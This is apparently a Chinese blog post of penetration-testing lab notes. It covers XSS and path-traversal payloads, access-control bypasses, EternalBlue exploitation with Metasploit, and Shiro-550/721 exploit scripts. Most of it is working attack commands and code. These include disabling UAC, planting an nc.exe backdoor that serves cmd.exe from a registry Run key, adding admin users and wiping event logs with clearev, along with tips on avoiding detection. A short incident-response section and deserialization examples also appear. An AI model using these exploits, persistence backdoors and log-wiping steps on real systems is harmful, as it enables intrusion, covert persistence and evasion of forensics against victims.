+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522133147.png" alt="20240522133147"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522133520.png" alt="20240522133520"></p>
+<p>模式选用固定字典，不然会因为，token的变化，burp会一直去寻找组合，然后无限循环</p>
+<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><h6 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h6><p>漏洞成因，未过滤，直接接受用户传递的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522173226.png" alt="20240522173226"></p>
+<p>传入长度被限制</p>
+<p>修改之后替换内容<code>&lt;script&gt;alert(/1/)&lt;/script&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522174000.png" alt="20240522174000"></p>
+<p>成功执行</p>
+<h6 id="反射性xss-post"><a href="#反射性xss-post" class="headerlink" title="反射性xss(post)"></a>反射性xss(post)</h6><p>就是多了一个验证，登录之后<code>&lt;script&gt;alert(/1/)&lt;/script&gt;</code>注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522174135.png" alt="20240522174135"></p>
+<h6 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h6><p>我的xss甚至还可以看到被appscan扫描过，写入数据库中的内容</p>
+<p>因为是从数据库中取内容，所以我们可以很明显的看到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522174627.png" alt="20240522174627"></p>
+<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h5 id="不安全下载"><a href="#不安全下载" class="headerlink" title="不安全下载"></a>不安全下载</h5><p>可以很清晰的看到，下载文件的url<br><code>/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</code></p>
+<p><code>/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../etc/passwd</code></p>
+<h5 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h5><h6 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h6><p>点击提示<code>lucy/123456,lili/123456,kobe/123456</code>，给了我们三个账号密码</p>
+<p>假设lucy是我们自己的，我们登录查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515183944.png" alt="20240515183944"></p>
+<p>我们看url的格式，发现<code>username</code>字段控制用户名,我们尝试直接修改其他人的用户名<br><code>username=lili</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515184207.png" alt="20240515184207"></p>
+<p>查看到他人信息</p>
+<p>在漏洞挖掘的场景下，有的登录的认证报错会提示我们是密码还是用户名错误，或者用户名是很容易查询的就可以利用这种方式取访问他人信息</p>
+<h6 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h6><p><code>admin/123456,pikachu/000000</code>两个账号，admin是管理员账号</p>
+<p>两个我们都登录一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515185405.png" alt="20240515185405"></p>
+<p>超级用户的url,<code>http://192.168.233.134/pikachu/vul/overpermission/op2/op2_admin.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515185228.png" alt="20240515185228"></p>
+<p>然后我们可以发现，普通用户登录的url,<code>http://192.168.233.134/pikachu/vul/overpermission/op2/op2_user.php</code></p>
+<p>直接在普通用户的界面修改url<code>http://192.168.233.134/pikachu/vul/overpermission/op2/op2_admin.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515185929.png" alt="20240515185929"></p>
+<p>直接登录成功</p>
+<p>修改方式，我们可以储存一个加密的cookie或者token，用来认证，是否是管理员登录(例如jwt之类的)</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="win7永痕之蓝复现"><a href="#win7永痕之蓝复现" class="headerlink" title="win7永痕之蓝复现"></a>win7永痕之蓝复现</h4><ul>
+<li>需要关闭防火墙</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416231435.png" alt="20240416231435"></p>
+<ul>
+<li>开启远程设置</li>
+</ul>
+<p>控制面板\系统和安全\系统<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521112502.png" alt="20240521112502"></p>
+<ul>
+<li>卸载全部安全补丁<br>控制面板→程序→卸载程序→已安装更新</li>
+</ul>
+<p>把能卸载的全部卸载。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521113113.png" alt="20240521113113"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521110323.png" alt="20240521110323"></p>
+<p>扫描端口，和开放的服务</p>
+<p><code>445/tcp  open  microsoft-ds</code></p>
+<p>永恒之蓝利用的就是445端口的SMB服务，操作系统溢出漏洞。</p>
+<ul>
+<li>使用Metasploit（MSF）工具</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole      	   #进入Meatasploit</span><br><span class="line">saerch ms17-010      #命令搜索漏洞编号ms17-010相关模块</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521110907.png" alt="20240521110907"></p>
+<p>存在445端口，所以现在使用模块2，辅助模块来验证以下<br><code>use 2</code>使用编号为2的模块<br><code>options</code>查看需要的参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521111758.png" alt="20240521111758"></p>
+<p>可以看到必填的模块就只有<code>RHOSTS</code>没有填写</p>
+<p><code>set RHOSTS 192.168.233.134</code></p>
+<p>使用<code>set</code>命令设置参数后使用<code>run</code>命令运行该模块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521113830.png" alt="20240521113830"></p>
+<p>成功发现,永恒之蓝</p>
+<p>接下来利用攻击模块去进行攻击<code>use 0</code> 还可以使用<code>info</code>查看漏洞信息，方便我们更好的去利用<br><code>show payloads</code> 设置攻击载荷<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521114410.png" alt="20240521114410"></p>
+<p>同样发现就只有<code>RHOSTS</code>需要设置,设置为需要攻击的ip</p>
+<p>但是一般会有默认的payload,输入options是能看到这些设置的<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521114942.png" alt="20240521114942"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521115314.png" alt="20240521115314"><br>报错，更换端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521115603.png" alt="20240521115603"></p>
+<p>利用成功，拿到shell</p>
+<h5 id="获取的windows的shell乱码"><a href="#获取的windows的shell乱码" class="headerlink" title="获取的windows的shell乱码"></a>获取的windows的shell乱码</h5><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521135202.png" alt="20240521135202"></p>
+<p>发现kail这边显示的乱码</p>
+<ul>
+<li>先查看本机是否支持中文</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521135258.png" alt="20240521135258"></p>
+<ul>
+<li>查看windows靶机</li>
+</ul>
+<p><code>chcp 查看编码设置</code>936即表示cmd，是正常的!（936表示其系统默认编码是GBK）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521135358.png" alt="20240521135358"></p>
+<p>尽管两个系统都没有问题！但是要善于观察不同与区别，现在的实验是Kali在通过msf来获取Windows系统 连接它，即本质是在Linux系统上连接Windows机，尽管还是在Linux上操作目标机Windows但是两者系统的中文编码不同</p>
+<p>Windows的默认编码为GBK,Linux的默认编码为UTF-8</p>
+<p>找到乱码原因:就是windows和linux系统的中文编码不同,所以导致windows系统上的中文在linux系统上会乱码</p>
+<p>解决问题：改变当前活动代码页为 UTF-8,让当前的批处理窗口支持UTF-8 格式的文件</p>
+<p>Chcp 65001<br>(Chcp 65001 的意思是 改变当前活动代码页为 UTF-8,让当前的批处理窗口支持UTF-8 格式的文件)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521135652.png" alt="20240521135652"></p>
+<p>成功解决乱码</p>
+<h5 id="windows后渗透-模拟实战"><a href="#windows后渗透-模拟实战" class="headerlink" title="windows后渗透(模拟实战)"></a>windows后渗透(模拟实战)</h5><h6 id="管理员用户创建"><a href="#管理员用户创建" class="headerlink" title="管理员用户创建"></a>管理员用户创建</h6><ul>
+<li>使用msf创建用户</li>
+</ul>
+<p><code>run post/windows/manage/enable_rdp USERNAME=hacker PASSWORD=shell</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521215243.png" alt="20240521215243"></p>
+<p>创建成功</p>
+<ul>
+<li>使用shell创建用户</li>
+</ul>
+<p><code>net user admin 123456 /add          #net user 用户名 密码 /add</code></p>
+<p><code>net user 						    #查看用户是否添加成功</code></p>
+<p><code>net localgroup administrators admin /add          #权限提升到管理级别</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521220504.png" alt="20240521220504"></p>
+<h6 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h6><p><code>netstat -ano        #查看端口开启状态，主要是看3389</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521220636.png" alt="20240521220636"></p>
+<p>能看没有3389端口，开启3389端口</p>
+<p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521220743.png" alt="20240521220743"></p>
+<p><code>rdesktop 192.168.233.134     #远程连接</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521220855.png" alt="20240521220855"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521221035.png" alt="20240521221035"></p>
+<p>但是一定要注意，一般这样的连接，需要确定，对方没有人在线，否则windows会弹出一窗口，去询问正在使用windows机器的人是否同意远程桌面的连接，这样就非常容易被发现</p>
+<h6 id="关闭主机防护策略并开启后门"><a href="#关闭主机防护策略并开启后门" class="headerlink" title="关闭主机防护策略并开启后门"></a>关闭主机防护策略并开启后门</h6><ol>
+<li>创建防火墙规则</li>
+</ol>
+<p>防止防火墙以后是开启的，所以提前创建一条防火墙规则允许4444端口访问网络，方便后期操作</p>
+<p><code>netsh firewall add portopening TCP 4444 &quot;tubage&quot; ENABLE ALL</code></p>
+<ol start="2">
+<li>关闭UAC<br>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。</li>
+</ol>
+<p>其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>
+<p><code>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></p>
+<ol start="3">
+<li>开启默认共享</li>
+</ol>
+<p><code>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></p>
+<p>开启系统主机的默认共享，也叫隐藏共享，是用来远程管理的，一般的时候看不到的，但是非常方便黑客利用这个功能，远程执行命令。</p>
+<h6 id="使用psexec"><a href="#使用psexec" class="headerlink" title="使用psexec"></a>使用psexec</h6><p>psexec 是 windows 下非常好的一款远程命令行工具。</p>
+<p>原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为&quot;PSEXESVC&quot;的二进制文件。然后，通过psexec服务运行命令，运行结束后删除服务。</span><br><span class="line">在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。</span><br><span class="line">命令执行后，psexec服务将会被自动删除。</span><br></pre></td></tr></table></figure>
+
+<p>由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。</p>
+<ol>
+<li>使用扫描模块</li>
+</ol>
+<p><code>use exploit/windows/smb/psexec</code></p>
+<ol start="2">
+<li><p>查看参数，并配置需要的参数</p>
+</li>
+<li><p>设置目标IP、用户名、密码以及工作组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.109.130     #设置目标IP</span><br><span class="line">set smbuser tubage             #设置目标用户名</span><br><span class="line">set smbpass 123.com            #设置目标密码</span><br><span class="line">set smbdomain WORKGROUP        #设置目标工作组（在计算机属性里面能看到所属工作组）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行攻击</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521223303.png" alt="20240521223303"></p>
+<p>成功，这个漏洞需要知道用户名和密码，还有就是需要开启默认共享</p>
+<p><code>getuid #查看当前权限</code></p>
+<h6 id="上传后门"><a href="#上传后门" class="headerlink" title="上传后门"></a>上传后门</h6><p>为了让连接持久话，我们可以上传后门程序，这样就能保持会话长久建立。<br>在kali 中如下路径有我们的后门程序nc.exe 俗称瑞士军刀。</p>
+<ol>
+<li>上传瑞士军刀（nc.exe）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows     </span><br><span class="line">#上传到目标主机C盘Windows目录下，如果要更隐秘一点的话，可以往更深处存放</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521223725.png" alt="20240521223725"></p>
+<ol start="2">
+<li>使用msf 设置键值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\nc.exe -Ldp 9002 -e cmd.exe&#x27;</span><br><span class="line">#当目标主机开机时，程序后台运行，且监听端口为9002，这个端口可自行设置。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>找一个未被占用的端口开放</p>
+<h6 id="连接后门"><a href="#连接后门" class="headerlink" title="连接后门"></a>连接后门</h6><ol>
+<li><p>重启目标主机<br><code>reboot</code></p>
+</li>
+<li><p>使用瑞士军刀 NETCAT-NC进行连接<br><code>nc -v 192.168.233.134 9002</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521224344.png" alt="20240521224344"></p>
+</li>
+</ol>
+<h6 id="抹除事件日志"><a href="#抹除事件日志" class="headerlink" title="抹除事件日志"></a>抹除事件日志</h6><p>msf <code>clearev</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521224600.png" alt="20240521224600"></p>
+<h4 id="Shiro-550和Shiro-721复现"><a href="#Shiro-550和Shiro-721复现" class="headerlink" title="Shiro-550和Shiro-721复现"></a>Shiro-550和Shiro-721复现</h4><h5 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h5><p>vulhub靶场搭建</p>
+<p>shiro550漏洞原理<br>shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro会对用户传入的cookie进行解密并进行反序列化，服务端接收rememberMe的cookie值后的操作是：Cookie中rememberMe字段内容—&gt; Base64解码—&gt; 使用密钥进行AES-CBC解密—&gt; 反序列化</p>
+<p>成因利用默认的密钥加密，并且对解密之后的数据不做处理，再进行反序列化<br>构造恶意代码，利用加密方式加密然后</p>
+<p>docker开启靶场<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510143458.png" alt="20240510143458"></p>
+<p>先利用工具</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511104810.png" alt="20240511104810"></p>
+<p>给上网址直接,出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511112253.png" alt="20240511112253"></p>
+<p>反弹shell，成功</p>
+<p>拿到页面，我们首先需要正确登录获取，服务端生成的cookie</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511103953.png" alt="20240511103953"></p>
+<p>AES默认密钥加密脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class morenkeyjiami &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>java加密脚本</p>
+<p>python加密脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    payload = encode_rememberme(&quot;ip&quot;)    </span><br><span class="line">    print (&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511120659.png" alt="20240511120659"></p>
+<p>但是一直出现报错，但是的确是尝试去连接了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511120739.png" alt="20240511120739"></p>
+<p>后面看了别人的博客，发现了，利用这个jar包来进行监听</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13239046.html">java监听</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511142511.png" alt="20240511142511"></p>
+<h6 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h6><p>进入容器内部,查询<br><code>lastlog</code> 查询有没有人登录<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511122624.png" alt="20240511122624"></p>
+<p><code>top</code> 查看利用率<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511122556.png" alt="20240511122556"></p>
+<p>如果确定被攻击先要查杀后门和webshell</p>
+<p>查询日志<code>cat ~/.bash_history</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511131550.png" alt="20240511131550"></p>
+<p>查询到了不是我们执行的一些指令，并且反弹了shell</p>
+<p>可以通过这个ip去进行溯源，抓取此ip的流量,然后分析攻击链路，这个容器就只有一个web服务</p>
+<p>很明显就不需要去进行例如<br><code>last -F</code>查看近期登录和<code>lastb -n</code>n是数字，不需要查看像这种日志，这种日志，lastb会查看尝试登录的，哪怕没有登录成功，一般爆破就可以查询</p>
+<p>就像如果你开放了22(ssh)端口，且你的服务器，没有加ssh验证，就会可能有大量ssh连接</p>
+<p>我们现在ss也只有8080端口开放,且经过查询并未发现</p>
+<p>然后我们并没有搭建可以记录web流量的服务程序，所以建议，直接关闭web服务，拿去做渗透测试，或者现在搭建一个蜜罐，去模拟自己的环境，如果攻击者重新攻击，再来捕获攻击流量</p>
+<h5 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h5><p>靶机搭建</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3ndz/Shiro-721">github项目地址</a></p>
+<p>下载之后按照提示开启环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inspiringz/Shiro-721.git</span><br><span class="line">cd Shiro-721/Docker</span><br><span class="line">docker build -t shiro-721 .           </span><br><span class="line">需要加进去的，&#x27;.&#x27;表示 Docker 将会在当前目录下查找 Dockerfile 文件并以此为基础进行构建</span><br><span class="line"></span><br><span class="line">docker run -p 8080:8080 -d shiro-721</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510180803.png" alt="20240510180803"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510180815.png" alt="20240510180815"></p>
+<p>页面开起来</p>
+<p>在Shiro721中，密钥的生成方式变为了动态生成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public AbstractRememberMeManager() &#123;</span><br><span class="line">        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        AesCipherService cipherService = new AesCipherService();</span><br><span class="line">        this.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>想要了解可以去尝试跟进加密方式</p>
+<p>Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件。</p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/261">原理博客</a></p>
+<p>就是我们需要让填充攻击正确的去判断这个攻击是否有效，我们就需要一个bool类型的东西去注入，然后又因为填充攻击的填充内容改变，并不会造成响应包内出现<code>Set-Cookie: rememberMe=deleteMe</code>这个字段，那这样我们就创造了一个布尔型，不会因为填充错误异常和捕获块大小异常影响导致响应包内出现<code>Set-Cookie: rememberMe=deleteMe</code>，只会因为序列化错误导致异常</p>
+<p>Padding正确，服务器正常响应<br>Padding错误，服务器返回Set-Cookie: rememberMe&#x3D;deleteMe</p>
+<p>我们先点击记住，登录一个可以成功登录的账号<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510183720.png" alt="20240510183720"></p>
+<p>使用<code>/account/</code>页面的rememberMe<br><code>rememberMe=tg1ftgkBprCiDt7RHC9fQO46J/s2/ETI48XdRBAMpG9nEpc1KK7s/A1PaV0oahLKj3JVXDtIje6xy1ce9KXrCwjJo0GnAlgyQE2ycKcWo751bam9BbkfUKjRjf5v1eftPiK7ZQCw/JiEAfR6Jy5V+ELskSHiUWW/THdgYBosg4MUkkN6nJ8EsirreqvxM9P6Y3M2MmWNBIfdkueKwAecAU20bC0wA9YxZfojV9Yfb1e5z+KOj/SWj2eBuNkZjTIDDJp53w8QRB6VEcFzqfbxnDYR2ui9U4h2qNd3BdU4eF2dS34ENW//gJG1enO6MJFknNGBO2reSdCCEFdsMHPDCRFGk0+ZUfyzy+jopLDEDwWtc1KJqGP8ZN3Nofy/vfHlaikJIpAmW43q35XUbGMofFmgt/AAQUWWMEQ8z9drpVeiUkCcCTGi3RUBeGdEXP7pzVAQMakcTC+uvZ6XrCTF+JKN8xpdhUIUvghqbXj8amJWfdr3A5kpa62yrvlSakv7</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510183828.png" alt="20240510183828"></p>
+<p>先利用工具来打</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510184108.png" alt="20240510184108"></p>
+<p>填充攻击流量，非常大</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510213914.png" alt="20240510213914"></p>
+<p>选用dnslog</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240510214007.png" alt="20240510214007"></p>
+<p>接下来就是等待,而且因为攻击频率高，导致靶机好几次都寄了</p>
+<p>攻击路径<code>/account/</code></p>
+<p>流量特征就是有非常之多的<code>deleteme</code>字段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240511144003.png" alt="20240511144003"></p>
+<h6 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h6><p>反序列化漏洞指的是在Java反序列化过程中，攻击者利用序列化、反序列化的特性，通过构造恶意序列化对象来执行未经授权的操作，包括执行任意命令等。</p>
+<p>Java反序列化漏洞通常出现在接收到未经验证的序列化数据并将其反序列化为对象时。攻击者可以通过修改序列化数据中的类名或者通过自定义的类加载器来执行任意代码。</p>
+<ul>
+<li>序列化和反序列化函数<br>writeExternal(Objectoutput out) 用于序列化<br>readExternal(Objectinput in) 用于反序列化</li>
+</ul>
+<p>恶意序列化对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class EvilObject implements Serializable &#123;</span><br><span class="line">    private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException, IOException &#123;</span><br><span class="line">        // 执行命令的代码</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化恶意对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class DeserializationExample &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;payload.ser&quot;);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在实际攻击中，为了避免被杀毒软件拦截，攻击者通常会使用一些更加隐蔽的命令，例如通过反弹Shell获取远程控制权限。</p>
